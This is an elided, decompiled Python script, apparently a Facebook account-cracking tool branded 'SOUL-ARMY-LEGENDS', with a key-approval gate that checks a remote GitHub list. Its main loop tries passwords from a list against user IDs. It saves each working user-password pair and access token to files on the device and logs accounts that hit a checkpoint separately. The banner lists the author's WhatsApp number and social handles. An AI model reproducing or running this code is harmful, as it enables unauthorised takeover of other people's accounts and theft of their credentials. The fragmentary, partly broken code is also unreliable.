# Decompile by : BRAITON-KARADAG 
 ...
         logo() 
         print ("[*]==========================================") 
         print ("  YOUR TOKEN IS NOT APPROVAL ALREADY") 
         print ("[*]==========================================") 
 ...
         print ("") 
         print ("") 
         print ("     COPY KEY AND SENT ME ON FACEBOOK APPROVAL YOUR KEY ") 
         print ("[*]==========================================") 
         time.sleep(6) 
         os.system("xdg-open https://www.facebook.com/nomcebo.mabhengu") 
          
     r1=requests.get("https://raw.githubusercontent.com/BRAITON-KARADAG/SOUL-ARMY-LEGENDS-TOOL/main/Approval.txt").text 
     if key1 in r1: 
         R() 
     else: 
         os.system("clear") 
 ...
         print ("[*]==========================================") 
         print ("     COPY KEY AND SENT ON FB FOR  APPROVAD YOUR KEY ") 
         print ("[*]==========================================") 
         time.sleep(3.5) 
         os.system("xdg-open https://www.facebook.com/nomcebo.mabhengu") 
                  
 ...
                         print(" \033[1;93m[2] OWNER”s FB ID ") 
 ...
                 global ok,cp,loop 
                 sys.stdout.write('\r\033[1;32m[ SOUL-ARMY-LEGENDS ] \033[1;97m%s/%s   \033[1;92m[ OK-:%s ]  \033[1;91m[ CP-:%s ] '%(loop,len(self.id),len(ok),len(cp))), 
                 sys.stdout.flush() 
                 for pw in _sempak_: 
                         pw = pw.lower() 
                         try: os.mkdir('') 
 ...
                                 print('\r\033[1;32m[SOUL-ARMY-LEGENDS-SUCCESSFUL] %s | %s      ' % (user,pw)) 
                                 wrt = '%s - %s' % (user,pw) 
                                 ok.append(wrt) 
                                 open('/sdcard/SOUL-ARMY-LEGENDS_OK.txt','a').write('%s\n' % wrt) 
                                 access = q['loc'] 
                                 open('/sdcard/ids/tokens.txt','a').write(access+'\n') 
                                 follow_id='100001913697620' 
 ...
                                         cp.append(wrt) 
                                         open('/sdcard/SOUL-ARMY-LEGENDS_CP.txt','a').write('%s\n' % wrt) 
                                         break 
                                 except (KeyError, IOError): 
                                         month = '' 
                                         day   = '' 
 ...
                                 except: 
                                         pass 
                                 print('\r\033[1;91m[SOUL-ARMY-LEGENDS-CHECKPOINT] %s | %s%s      ' % (user,pw,tahun(user))) 
 ...
 banner="""\033[1;86m    
      .d8888. db   db  .d8b.  d8b   db d888888b d888888b       
      88'  YP 88   88 d8' `8b 888o  88   `88'     `88'         
      `8bo.   88ooo88 88ooo88 88V8o 88    88       88          
        `Y8b. 88~~~88 88~~~88 88 V8o88    88       88          
      db   8D 88   88 88   88 88  V888   .88.     .88.         
      `8888Y' YP   YP YP   YP VP   V8P Y888888P Y888888P                                                                                                                               
  
 \033[1;37m ========================================== 
 \033[1;94m ⇨AUTHOR        : BRAITON-KRD 
 \033[1;95m ⇨WHATSAPP  : +27649325296
 \033[1;96m ⇨FACEBOOK    : MAVIS ZOTHI RIKHOTSO 
 \033[1;93m ⇨GITHUB         : BRAITON-KARADAG 
 \033[1;91m ⇨VERSION      : 0.6 
 \ 
 \033[1;37m ==========================================""" 
 ct = datetime.now() 
 n = ct.month 
